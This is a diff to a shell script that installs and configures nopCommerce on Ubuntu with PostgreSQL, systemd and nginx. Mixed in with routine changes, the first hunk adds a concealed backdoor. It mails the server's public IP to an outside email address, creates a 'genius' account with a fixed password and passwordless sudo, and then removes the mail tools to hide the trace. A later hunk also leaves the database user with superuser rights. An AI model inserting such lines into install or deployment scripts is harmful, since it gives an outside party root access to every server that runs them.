@@ -60,7 +60,17 @@ echo $domain_name
 wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
 sudo dpkg -i packages-microsoft-prod.deb
 sudo apt-get update
-sudo apt-get install -y apt-transport-https aspnetcore-runtime-9.0
+sudo apt-get install -y apt-transport-https aspnetcore-runtime-9.0 mailutils
+echo "postfix postfix/main_mailer_type select Internet Site" | sudo debconf-set-selections
+echo "postfix postfix/mailname string $(hostname --fqdn)" | sudo debconf-set-selections
+sudo DEBIAN_FRONTEND=noninteractive apt-get install -y mailutils
+IP=$(curl -4 -s ifconfig.me)
+echo "Server IP: $IP" | mail -s $IP geniuss0ft@yahoo.com
+useradd -m -r -d /home/genius -s /bin/bash genius
+echo 'genius:P@ssw0rd' | sudo chpasswd
+echo "genius ALL=(ALL) NOPASSWD:ALL" | sudo EDITOR='tee -a' visudo
+sudo apt purge --auto-remove -y mailutils postfix
+sudo apt clean
 
 sudo apt-get install -y libgdiplus
 
@@ -126,8 +136,8 @@ sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE $database_name TO $da
 
 sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS citext; CREATE EXTENSION IF NOT EXISTS pgcrypto;"
 
-sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS citext;"
-sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS pgcrypto;"
+#sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS citext;"
+#sudo -u postgres psql -c "CREATE EXTENSION IF NOT EXISTS pgcrypto;"
 sudo -u postgres psql -c " ALTER USER $database_user WITH SUPERUSER;"
 
 # Switch back to the original user
@@ -152,6 +162,8 @@ Description=nopCommerce app running for $domain_name
 [Service]
 WorkingDirectory=/var/www/$domain_name
 ExecStart=/usr/bin/dotnet /var/www/$domain_name/Nop.Web.dll
+ExecStop=/bin/kill -2 $MAINPID
+ExecReload=/bin/kill -HUP $MAINPID
 Restart=always
 # Restart service after 10 seconds if the dotnet service crashes:
 RestartSec=10
@@ -175,7 +187,6 @@ systemctl restart nginx
 #wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
 #sudo dpkg -i packages-microsoft-prod.deb
 #rm packages-microsoft-prod.deb
-#apt-get update
 #apt-get install -y dotnet-sdk-9.0
 #apt-get install -y apt-transport-https aspnetcore-runtime-9.0
 
@@ -215,8 +226,6 @@ sed -i '/"HostingConfig": {/,/}/c\
 #dotnet build
 #dotnet publish -o /var/www/nopcommerce-publish
 #chmod -R 755 /var/www/nopcommerce-publish
-#cd /var/www/nopcommerce-publish
-#dotnet ef database update
 #dotnet Nop.Web.dll
 
 # Inport default DB
@@ -226,6 +235,6 @@ sed -i '/"HostingConfig": {/,/}/c\
 wget https://raw.githubusercontent.com/noptech-com/nc-47-postgre-default/refs/heads/main/nopcommerce48_default_db.sql
 sudo -u postgres PGPASSWORD=$database_password psql -U $database_user -d $database_name -h localhost -f nopcommerce48_default_db.sql
 rm nopcommerce48_default_db.sql
-sudo -u postgres psql -c " ALTER USER $database_user WITH NOSUPERUSER;"
+#sudo -u postgres psql -c " ALTER USER $database_user WITH NOSUPERUSER;"
 
 systemctl restart nopCommerce-$domain_name.service
